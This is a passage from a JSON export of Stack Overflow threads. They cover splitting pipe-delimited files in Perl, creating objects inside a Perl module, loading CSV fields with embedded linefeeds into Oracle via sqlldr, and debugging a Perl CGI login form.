"profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463037114, "post_id": 37067328, "comment_id": 61893069, "body": "@ninjagirl:  Why did you choose <code>$fields[176]</code>? As far as I can tell you want the eleventh pipe-separated field, which is <code>$fields[10]</code> since they start at zero"}, {"owner": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463037196, "post_id": 37067328, "comment_id": 61893131, "body": "i chose [176] cuz it is the field that i wanted to have. the comment above was just an example i have a really big file sir."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463043094, "post_id": 37067328, "comment_id": 61896947, "body": "@ninjagirl: You can replace <code>print &quot;@fields\\n&quot;;</code> with <code>printf &quot;%3d: %s\\n&quot;, $_, $fields[$_] for 0 .. $#fields;</code> so that you can see what values are at what index"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1467563030, "last_edit_date": 1467563030, "creation_date": 1462521955, "answer_id": 37067328, "question_id": 37066221, "link": "https://stackoverflow.com/questions/37066221/i-have-a-file-that-i-want-to-split-using-pipe-as-delimiter-how-can-i-read-the-f/37067328#37067328", "title": "I have a file that I want to split using pipe as delimiter. How can I read the file using Perl?", "body": "<p>It's far from clear from your question what it is that you want to do with these fields once you have split them</p>\n\n<p>Your own shell script uses <code>cat</code> to copy the entire contents of your file into <code>$file</code>, but that's unlikely to be what you need to do</p>\n\n<p>A very generalised Perl program would look like this</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nmy ($procDate) = @ARGV;\n\nprint \"Date $procDate\\n\";\n\nopen my $fh, '&lt;', \"filename_$procDate.txt\" or die $!;\n\nwhile ( &lt;$fh&gt; ) {\n    chomp;\n    my @fields = split /\\|/;\n\n    # do something with @fields, for instance\n    print \"@fields\\n\";\n}\n</code></pre>\n\n<p>That code splits each line on pipe <code>|</code> characters, puts the list of substrings in <code>@fields</code> and then prints it separated by spaces. But I can't guess what more you might want to do?</p>\n"}], "owner": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 81, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1467563030, "creation_date": 1462518018, "last_edit_date": 1462520528, "question_id": 37066221, "link": "https://stackoverflow.com/questions/37066221/i-have-a-file-that-i-want-to-split-using-pipe-as-delimiter-how-can-i-read-the-f", "title": "I have a file that I want to split using pipe as delimiter. How can I read the file using Perl?", "body": "<p>Here is a shell script reading the file.</p>\n\n<pre><code>#!/bin/sh\n\nprocDate=$1\necho \"Date $procDate\"\n\nfile=`cat filename_$procDate.txt`\n\necho \"$file\"\n</code></pre>\n\n<p>I want to convert it to Perl and use the <code>split</code> operator with pipe <code>|</code> as delimiter.</p>\n"}, {"tags": ["perl", "oop", "object"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462523461, "post_id": 37063688, "comment_id": 61680874, "body": "Are you saying you want a new <code>systemId</code> object within <code>$id</code>? Everything depends on what is in <code>systemId.pm</code>, what you want to do with this internal object, and how you want to initialise it. Please show <code>systemId.pm</code> and write some Perl code that shows how you would like to use it with an internal secondary object. By the way classes must begin with a capital letter, so your <code>systemId.pm</code> should be <code>SystemId.pm</code> and start with <code>package SystemId</code>"}], "answers": [{"tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": 3, "last_activity_date": 1462512766, "creation_date": 1462512766, "answer_id": 37064957, "question_id": 37063688, "link": "https://stackoverflow.com/questions/37063688/perl-object-inside-the-same-module/37064957#37064957", "title": "Perl object inside the same module", "body": "<p>As easy as:</p>\n\n<pre><code>my $id = systemId-&gt;new({_dom =&gt; \"dev\"});\n</code></pre>\n\n<p>You may also use...</p>\n\n<pre><code>my $id = __PACKAGE__-&gt;new({_dom =&gt; \"dev\"});\n</code></pre>\n\n<p>...but the first one is more obvious.</p>\n\n<p>A new object instance could be created everwhere, including the package/class itself.</p>\n\n<p>The <code>-&gt;new</code> function is typically:</p>\n\n<pre><code>sub new {\n    my $class = shift;\n    my $self = bless {@_}, $class;\n    return $self;\n}\n</code></pre>\n\n<p>The instance is actually created in the class module itself (using <code>bless</code>). There is no magic in <code>-&gt;new</code> in Perl, some modules also use another name, see <a href=\"http://search.cpan.org/perldoc?DateTime\" rel=\"nofollow\"><code>DateTime</code>'s</a> <code>-&gt;now</code> which does <code>-&gt;new(epoch =&gt; time)</code> internally.</p>\n"}, {"comments": [{"owner": {"reputation": 83, "user_id": 5634392, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/K9mh4.jpg?s=128&g=1", "display_name": "BashingPerl", "link": "https://stackoverflow.com/users/5634392/bashingperl"}, "edited": false, "score": 0, "creation_date": 1462515131, "post_id": 37064999, "comment_id": 61676827, "body": "What if I create the object inside sub prn?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 83, "user_id": 5634392, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/K9mh4.jpg?s=128&g=1", "display_name": "BashingPerl", "link": "https://stackoverflow.com/users/5634392/bashingperl"}, "edited": false, "score": 1, "creation_date": 1462515259, "post_id": 37064999, "comment_id": 61676872, "body": "@BashingPerl  You are pushing it, aren&#39;t you :).  I don&#39;t see a reason why not, we&#39;re in the scope and <code>bless</code>-ing has happened.  Just don&#39;t call <i>that</i> method.  Interesting to try ... tried, it works as expected.  Calling the method itself (inside of itself) is accepted and runs, and goes into an infinite loop."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462523599, "post_id": 37064999, "comment_id": 61680946, "body": "I don&#39;t see how you can speculate what code is in <code>systemId.pm</code>, and how the initialisation data is supposed to work for the secondary object"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462523845, "post_id": 37064999, "comment_id": 61681094, "body": "@Borodin  Oh, right. Thank you. Removing that comment. I think it that it is still OK the create an object in the package, after all code for the class has been seen ...?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 83, "user_id": 5634392, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/K9mh4.jpg?s=128&g=1", "display_name": "BashingPerl", "link": "https://stackoverflow.com/users/5634392/bashingperl"}, "edited": false, "score": 0, "creation_date": 1462524342, "post_id": 37064999, "comment_id": 61681412, "body": "@BashingPerl  I have to correct my response to &quot;<i>create object inside sub pm</i>&quot; -- depending on how the initialization is done, per Borodin&#39;s comment. If <code>$self</code> is fully initialized in the constructor, then you may use it. However, that is not always the case and the initialization process can be arbitrarily  convoluted and complex. So I&#39;d say that that would indeed be pushing it.  In fact, creating the object at any time before all package code has been seen may be troubling. I have removed that comment from my post."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462524734, "post_id": 37064999, "comment_id": 61681618, "body": "@Borodin Sorry to bother you, I don&#39;t understand.  I meant: is it OK to create an object at the end of the package file, after all other code, right before the return (the <code>1;</code>).  I don&#39;t see why not (but then I don&#39;t know how Perl&#39;s OO works inside)."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462529451, "post_id": 37064999, "comment_id": 61684590, "body": "@zdim: Ah, do you mean that the module code has been compiled? What I understood was that you thought the OP had shown the source of the module. When your main code does <code>use Play</code> it will compile and execute all of <code>Play.pm</code>. That means the <code>print</code> statements will be executed, <code>$obj</code> and <code>$data</code> will be created and defined, and then they are discarded when the compiler reaches the end of the file. Sometimes a <code>print</code> statement can be useful, and you could define <code>our</code> variables (but don&#39;t do that). A module is only for defining values -- mostly subroutines -- for use in other files"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462529556, "post_id": 37064999, "comment_id": 61684662, "body": "@zdim: So yes, you may create an object at the end of the module file, but it&#39;s of very little use as it will be discarded as soon as the <code>use</code> in the main code is compiled"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462558564, "post_id": 37064999, "comment_id": 61702657, "body": "@Borodin  Yes, that is what I meant, sorry. (That <i>code seen</i> is probably from C++ use, where in related situations may matter whether a piece of code has already <i>been seen</i> by the comiler for some following statement to be at least allowed.)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462559659, "post_id": 37064999, "comment_id": 61703246, "body": "@Borodin I don&#39;t know how Perl compiles a class from the package file -- when it builds code to run (&quot;opcodes&quot;?) and in what order. May it know to wait with instantiating an object inside package until the whole class is compiled? The <code>$self</code> <i>may</i> use methods not &quot;seen&quot; yet, defined after it in the source (after bless&#39;s <code>;</code> or after constructor&#39;s last <code>}</code>, I guess). As the code in package runs only when loaded in another file, perhaps an object may be created anywhere in package source? This is what I meant under &quot;<i>been seen</i>&quot;.  I guess it does come down to initialization, as you say."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462559968, "post_id": 37064999, "comment_id": 61703408, "body": "@Borodin  I don&#39;t see why this is done, either, thus the last sentence in my answer (which I tweaked slightly since).  Perhaps there is some heavy processing, where using <code>$self</code> alone isn&#39;t enough for some reason? Or it&#39;s just curiosity?  From the point of view of some other languages, for Perl I find it to be a very interesting question -- just how much one may do in the class (package file) itself."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 4, "last_activity_date": 1591694943, "last_edit_date": 1591694943, "creation_date": 1462512907, "answer_id": 37064999, "question_id": 37063688, "link": "https://stackoverflow.com/questions/37063688/perl-object-inside-the-same-module/37064999#37064999", "title": "Perl object inside the same module", "body": "<p>That can be done the same way it's done in a script. Similarly to how you can put the package and <code>main::</code> in the same file, you can use the class in the package file once it is defined.  See comments after code.</p>\n\n<p>File <strong>Play.pm</strong></p>\n\n<pre><code>package Play;    \nuse warnings;\nuse strict;\n\nsub new {\n    my $class = shift;\n    my $self = { _data =&gt; shift || 'default' }; \n    bless $self, $class;\n    print \"New object created.\\n\";\n    return $self;\n}\n\nsub data {\n    my $self = shift;\n    if (@_) { $self-&gt;{_data} = shift }\n    return $self-&gt;{_data};\n}\n\nprint \"Inside the package. Create object.\\n\";\nmy $obj = Play-&gt;new();\nmy $data = $obj-&gt;data();\nprint \"data: $data\\n\";\nprint \"\\n\";\n\n1;\n</code></pre>\n\n<p>The script</p>\n\n<pre><code>use warnings;\nuse strict;\nuse Play;\n\nprint \"In main\\n\";\nmy $obj = Play-&gt;new(25);\nprint \"data: \" . $obj-&gt;data() . \"\\n\";\n</code></pre>\n\n<p>Printout when running the script</p>\n\n<pre>Inside the package. Create object.\nNew object created.\ndata: default\n\nIn main\nNew object created.\ndata: 25\n</pre>\n\n<p>Once the <code>bless</code> call executed then <code>$self</code> is an object of the class <code>Play</code>. From <a href=\"http://perldoc.perl.org/functions/bless.html\" rel=\"nofollow noreferrer\">bless</a></p>\n\n<blockquote>\n  <p>bless REF,CLASSNAME<br>\n      bless REF<br>\n      This function tells the thingy referenced by REF that it is now an object in the CLASSNAME package. If CLASSNAME is omitted, the current package is used. [...]</p>\n</blockquote>\n\n<p>Since we are right in the package it can be used as an object and methods called on it. From <a href=\"http://perldoc.perl.org/perlobj.html\" rel=\"nofollow noreferrer\">perlobj</a></p>\n\n<blockquote>\n  <p>Once we've blessed the hash referred to by <code>$self</code> we can start calling methods on it.</p>\n</blockquote>\n\n<p>This refers to working with <code>$self</code> hashref, which became the object.</p>\n\n<p>Note that there may be issues of initialization when it comes to creating an object and the questions of what exactly is being done and how may be important.</p>\n\n<hr>\n\n<p>I can't help it but ask, what do you want to do with this?</p>\n"}], "owner": {"reputation": 83, "user_id": 5634392, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/K9mh4.jpg?s=128&g=1", "display_name": "BashingPerl", "link": "https://stackoverflow.com/users/5634392/bashingperl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 715, "favorite_count": 0, "accepted_answer_id": 37064999, "answer_count": 2, "score": 0, "last_activity_date": 1591694943, "creation_date": 1462504977, "last_edit_date": 1508599306, "question_id": 37063688, "link": "https://stackoverflow.com/questions/37063688/perl-object-inside-the-same-module", "title": "Perl object inside the same module", "body": "<p>The title is vague but I'll explain it.</p>\n\n<p>I have a Perl script which uses a module named <code>systemId</code></p>\n\n<p>I create an object inside the script</p>\n\n<pre><code>my $id = systemId-&gt;new({_dom =&gt; \"dev\"});\n</code></pre>\n\n<p>I am planning to instantiate an object similar to the one above but inside the systemId.pm.</p>\n\n<p>How do I do that?</p>\n\n<p>I can't really search it on the net as I do not know what to search to begin with.</p>\n"}, {"tags": ["regex", "linux", "perl", "shell", "sql-loader"], "comments": [{"owner": {"reputation": 19601, "user_id": 1620779, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/dlgGb.png?s=128&g=1", "display_name": "sjsam", "link": "https://stackoverflow.com/users/1620779/sjsam"}, "edited": false, "score": 0, "creation_date": 1462502835, "post_id": 37063357, "comment_id": 61673218, "body": "What about the line  numbers? Also is there a blank line after each record ?"}, {"owner": {"reputation": 17784, "user_id": 1646322, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d9fd7a75e0d8ace7bb3276476786c2c0?s=128&d=identicon&r=PG", "display_name": "Ruslan Osmanov", "link": "https://stackoverflow.com/users/1646322/ruslan-osmanov"}, "edited": false, "score": 0, "creation_date": 1462503246, "post_id": 37063357, "comment_id": 61673308, "body": "Do you want to remove <i>all</i> new lines in the the second column?"}, {"owner": {"reputation": 27, "user_id": 6298205, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/725feb4155a27e053f46edf3a32c7b5b?s=128&d=identicon&r=PG&f=1", "display_name": "Chidam", "link": "https://stackoverflow.com/users/6298205/chidam"}, "edited": false, "score": 0, "creation_date": 1462503311, "post_id": 37063357, "comment_id": 61673321, "body": "Hi sjsam,   actually line number is not required, keep the blank line as it is. going to load this field into oracle table using sql loader, consider two fields and three records is exist"}, {"owner": {"reputation": 27, "user_id": 6298205, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/725feb4155a27e053f46edf3a32c7b5b?s=128&d=identicon&r=PG&f=1", "display_name": "Chidam", "link": "https://stackoverflow.com/users/6298205/chidam"}, "edited": false, "score": 0, "creation_date": 1462503450, "post_id": 37063357, "comment_id": 61673350, "body": "I have used , as delimiter for csv"}, {"owner": {"reputation": 27, "user_id": 6298205, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/725feb4155a27e053f46edf3a32c7b5b?s=128&d=identicon&r=PG&f=1", "display_name": "Chidam", "link": "https://stackoverflow.com/users/6298205/chidam"}, "edited": false, "score": 0, "creation_date": 1462503638, "post_id": 37063357, "comment_id": 61673392, "body": "yes Ruslan, dont merge the lines , keep the blanklines as it is"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1462504199, "post_id": 37063357, "comment_id": 61673529, "body": "I&#39;m confused... Are the line numbers <i>in</i> the actual file? What change are you <b>actually</b> trying to make to the file here?"}, {"owner": {"reputation": 27, "user_id": 6298205, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/725feb4155a27e053f46edf3a32c7b5b?s=128&d=identicon&r=PG&f=1", "display_name": "Chidam", "link": "https://stackoverflow.com/users/6298205/chidam"}, "edited": false, "score": 0, "creation_date": 1462506354, "post_id": 37063357, "comment_id": 61673991, "body": "Hi Etan, I shown the line number for reference, I shown the diagram for long_text field , This is excel data while i moved into unix this field is splited and comes into many lines, i dont want to split it, want to keep the format same as input csv."}, {"owner": {"reputation": 8689, "user_id": 2543416, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/49d22ba9f6a73aa755e76c2caabb967e?s=128&d=identicon&r=PG", "display_name": "Gary_W", "link": "https://stackoverflow.com/users/2543416/gary-w"}, "edited": false, "score": 0, "creation_date": 1463147534, "post_id": 37063357, "comment_id": 61954773, "body": "I&#39;m afraid your specs are not clear and you included sql-loader as a tag but ask for a shell level solution.  Are you ultimately loading this data into an Oracle database and want to preserve the newlines in the comment field?"}], "answers": [{"comments": [{"owner": {"reputation": 27, "user_id": 6298205, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/725feb4155a27e053f46edf3a32c7b5b?s=128&d=identicon&r=PG&f=1", "display_name": "Chidam", "link": "https://stackoverflow.com/users/6298205/chidam"}, "edited": false, "score": 0, "creation_date": 1463414834, "post_id": 37216660, "comment_id": 62043611, "body": "Hi Gary, Its working amazing, This is what i expected Thank you very much :)"}, {"owner": {"reputation": 8689, "user_id": 2543416, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/49d22ba9f6a73aa755e76c2caabb967e?s=128&d=identicon&r=PG", "display_name": "Gary_W", "link": "https://stackoverflow.com/users/2543416/gary-w"}, "reply_to_user": {"reputation": 27, "user_id": 6298205, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/725feb4155a27e053f46edf3a32c7b5b?s=128&d=identicon&r=PG&f=1", "display_name": "Chidam", "link": "https://stackoverflow.com/users/6298205/chidam"}, "edited": false, "score": 0, "creation_date": 1463418252, "post_id": 37216660, "comment_id": 62045503, "body": "Great, glad to hear it helped."}], "tags": [], "owner": {"reputation": 8689, "user_id": 2543416, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/49d22ba9f6a73aa755e76c2caabb967e?s=128&d=identicon&r=PG", "display_name": "Gary_W", "link": "https://stackoverflow.com/users/2543416/gary-w"}, "is_accepted": true, "score": 1, "last_activity_date": 1463162923, "creation_date": 1463162923, "answer_id": 37216660, "question_id": 37063357, "link": "https://stackoverflow.com/questions/37063357/line-breaking-issue-to-move-csv-file-in-linux/37216660#37216660", "title": "Line breaking issue to move csv file in Linux", "body": "<p>As I said in my comment above, the specs are not clear but I suspect this is what you are trying to do.  Here's a way to load data into Oracle using <code>sqlldr</code> where a field is surrounded by double-quotes and contains linefeeds where the end of the record is a combination carriage return/linefeed. This can happen when the data comes from an Excel spreadsheet saved as a .csv for example, where the cell contains the linefeeds. </p>\n\n<p>Here's the data file as exported by Excel as a .csv and viewed in gvim, with the option turned on to show control characters.  You can see the linefeeds as the <code>'$'</code> character and the carriage returns as the <code>'^M'</code> character:</p>\n\n<pre><code>100,test1,\"1line1$\n1line2$\n1line3\"^M$\n200,test2,\"2line1$\n2line2$\n2line3\"^M$\n</code></pre>\n\n<p>Construct the control file like this using the <code>\"str\"</code> clause on the infile option line to set the end of record character.  It tells sqlldr that hex 0D (carriage return, or ^M) is the record separator (this way it will ignore the linefeeds inside the double-quotes):</p>\n\n<pre><code>LOAD DATA\ninfile \"test.dat\" \"str x'0D'\" \nTRUNCATE\nINTO TABLE test\nreplace\nfields terminated by \",\"  \noptionally enclosed by '\"'\n(\ncola char,\ncolb char,\ncolc char\n)\n</code></pre>\n\n<p>After loading, the data looks like this with linefeeds in the comment field (I called it colc) preserved:</p>\n\n<pre><code>SQL&gt; select *\n  2  from test;\n\nCOLA                 COLB                 COLC\n-------------------- -------------------- --------------------\n100                  test1                1line1\n                                          1line2\n                                          1line3\n\n200                  test2                2line1\n                                          2line2\n                                          2line3\n\nSQL&gt;\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 6298205, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/725feb4155a27e053f46edf3a32c7b5b?s=128&d=identicon&r=PG&f=1", "display_name": "Chidam", "link": "https://stackoverflow.com/users/6298205/chidam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2007, "favorite_count": 2, "accepted_answer_id": 37216660, "answer_count": 1, "score": 0, "last_activity_date": 1463162923, "creation_date": 1462502406, "last_edit_date": 1462552493, "question_id": 37063357, "link": "https://stackoverflow.com/questions/37063357/line-breaking-issue-to-move-csv-file-in-linux", "title": "Line breaking issue to move csv file in Linux", "body": "<p>[I have moved the csv file into Linux system with binary mode. File content of one field is spitted into multiple lines its comment sections,I need to remove the new line , keep the same format, Please help on shell command or perl command</p>\n\n<p>here is the example for three records, Actual look like]\n<a href=\"http://i.stack.imgur.com/Zsd1Q.jpg\" rel=\"nofollow\">Original content of the file</a></p>\n\n<p>[After moved into linux, comments field is splitted into 4 lines , i want to keep the comment field in the same format but dont want the new line characters</p>\n\n<p>\"First line</p>\n\n<p>Second line</p>\n\n<p>Third line\nall lines format should not change\"\n]<a href=\"http://i.stack.imgur.com/wLOJ0.jpg\" rel=\"nofollow\">2</a> </p>\n"}, {"tags": ["html", "perl", "login", "cgi"], "comments": [{"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 0, "creation_date": 1462512895, "post_id": 37062019, "comment_id": 61675891, "body": "Not related to the question, but what that <code>onfocus=&quot;(this.value == &#39;123456&#39;) &amp;&amp; (this.value = &#39;&#39;)&quot;onblur=&quot;(this.value == &#39;&#39;) &amp;&amp; (this.value = &#39;123456&#39;)&quot;</code> for?"}, {"owner": {"reputation": 97, "user_id": 4010164, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/6e047ccfef3f6e0119f254d858bb2c12?s=128&d=identicon&r=PG&f=1", "display_name": "Rory Perry", "link": "https://stackoverflow.com/users/4010164/rory-perry"}, "reply_to_user": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 1, "creation_date": 1462630244, "post_id": 37062019, "comment_id": 61722962, "body": "The onfocus removes the value from the field when clicked if its still set to default. The onblur on the otherhand will reset the field to default if no data is entered when you click out of it."}], "answers": [{"tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": 1, "last_activity_date": 1462513828, "creation_date": 1462513828, "answer_id": 37065194, "question_id": 37062019, "link": "https://stackoverflow.com/questions/37062019/perl-html-basic-login/37065194#37065194", "title": "Perl/HTML Basic Login", "body": "<p>The CGI module you're (obviously) using also supports <a href=\"http://search.cpan.org/~leejo/CGI-4.28/lib/CGI.pod#Fetching_the_parameter_list_as_a_hash\" rel=\"nofollow\"><em>fetching the parameter list as a hash</em></a>. You should try to dump this out to the see complete request:</p>\n\n<pre><code>print Dumper($cgi-&gt;Vars);\n</code></pre>\n\n<p>You'll notice that the <code>Login</code> button is a <code>&lt;input ...&gt;</code> tag like the others and behaves exactly the same way: By setting a parameter defined by the <code>name=</code> and <code>value=</code> properties.</p>\n\n<p>Three additional remarks on your script:</p>\n\n<ol>\n<li><code>if ($user = $luser){</code> says: Try to copy the value of <code>$luser</code> into the variable <code>$user</code>. If this succeeds and the new value of <code>$user</code> is true (not 